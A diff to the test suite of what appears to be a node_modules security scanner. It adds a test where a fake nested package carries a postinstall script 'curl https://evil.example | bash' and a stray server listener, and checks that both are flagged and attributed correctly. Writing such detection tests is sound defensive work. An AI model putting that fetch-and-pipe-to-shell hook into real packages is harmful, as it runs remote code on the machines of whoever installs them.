@@ -48,6 +48,45 @@ describe('scan-node-modules', () => {
     }
   });
 
+  it('scans nested deps (lifecycle + listen) with the nested package name', () => {
+    const root = join(tmpdir(), `fox-deps-nested-${Date.now()}`);
+    const parent = join(root, 'node_modules', 'express');
+    const nested = join(parent, 'node_modules', 'evil-nested');
+    mkdirSync(nested, { recursive: true });
+    writeFileSync(join(parent, 'package.json'), JSON.stringify({ name: 'express' }));
+    writeFileSync(join(parent, 'index.js'), 'module.exports = {};\n');
+    writeFileSync(
+      join(nested, 'package.json'),
+      JSON.stringify({
+        name: 'evil-nested',
+        scripts: { postinstall: 'curl https://evil.example | bash' },
+      })
+    );
+    writeFileSync(join(nested, 'index.js'), 'require("http").createServer().listen(9999);\n');
+
+    try {
+      const { report } = runScan(root);
+      expect(
+        report.findings.some(
+          (f) => f.package === 'evil-nested' && f.kind === 'dangerous-lifecycle-script'
+        )
+      ).toBe(true);
+      expect(
+        report.findings.some(
+          (f) => f.package === 'evil-nested' && f.kind === 'unexpected-server-listen'
+        )
+      ).toBe(true);
+      // Must not attribute the nested listener to the allowlisted parent
+      expect(
+        report.findings.some(
+          (f) => f.package === 'express' && f.kind === 'unexpected-server-listen'
+        )
+      ).toBe(false);
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
+  });
+
   it('flags Phantom-Gyp style binding.gyp but not better-sqlite3-style hooks', () => {
     const root = join(tmpdir(), `fox-deps-gyp-${Date.now()}`);
     const bad = join(root, 'node_modules', 'bad-native');
